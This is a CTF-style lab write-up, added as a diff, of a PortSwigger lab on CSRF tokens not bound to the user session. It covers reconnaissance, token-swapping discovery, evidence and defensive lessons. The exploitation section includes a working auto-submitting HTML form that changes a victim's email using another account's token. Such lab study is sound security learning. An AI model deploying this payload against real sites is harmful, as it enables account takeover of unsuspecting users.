@@ -1,0 +1,62 @@
+================================
+LAB: CSRF where token is not tied to user session
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-03
+Lab URL: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session [web:3]
+Category: CSRF
+Level: Apprentice
+Objective: Change the victim user's email address via CSRF.
+Description: Email change functionality uses CSRF tokens that are not bound to the user's session, allowing reuse of a valid token across accounts. [web:3]
+
+[RECONNAISSANCE]
+----------------
+- Logged in as wiener:peter and browsed to /my-account.
+- Identified POST /my-account/change-email handling email change with parameters: email, csrf.
+- Observed a hidden csrf field in the change-email form populated with a server-generated token.
+- Logged in as carlos:montoya in a separate session and confirmed same endpoint and parameter structure.
+- Noted that each email change request contained a fresh csrf token, and tokens appeared single-use.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- Verified that a valid csrf token from one user account could be reused with a different authenticated session.
+- Confirmed that the server only validated "token is in global valid pool" instead of "token belongs to this user's session". [web:3]
+- Determined that CSRF protection was present but improperly implemented (token not tied to user session, single-use only).
+
+[EXPLOITATION]
+--------------
+- Logged in as wiener and initiated an email change to capture a fresh csrf token in Burp.
+- Intercepted the POST /my-account/change-email request and copied the unused csrf value.
+- Dropped the intercepted request to keep the token unused.
+- Crafted the following CSRF payload and hosted it on the exploit server:
+
+  <html>
+    <body>
+      <form action="https://<LAB-HOST>/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="attacker@test.ca" />
+        <input type="hidden" name="csrf" value="<UNUSED_WIENER_TOKEN>" />
+      </form>
+      <script>
+        document.forms[0].submit();
+      </script>
+    </body>
+  </html>
+
+- Logged in as carlos, then accessed the exploit server page to simulate victim interaction.
+- The browser sent carlos's session cookies with the attacker-controlled POST request containing wiener’s csrf token.
+
+[EVIDENCE]
+----------
+- After visiting the exploit URL while authenticated as carlos, the account page showed the email updated to attacker@test.ca.
+- No CSRF validation error was returned; the server accepted a csrf token generated for another user session.
+- Lab backend reported the challenge as solved.
+
+[LESSONS LEARNED]
+-----------------
+- CSRF tokens must be bound to the user session; global token pools are insecure. [web:3]
+- Single-use tokens alone are not sufficient if they are not session-specific.
+- Always test CSRF by swapping tokens between accounts when multiple test users are available.
+- Manual Burp Repeater/Proxy tests are effective to validate CSRF token binding behavior.
+- Proper CSRF defenses should combine session-bound tokens with other checks (Origin/Referer, SameSite cookies). [web:3]
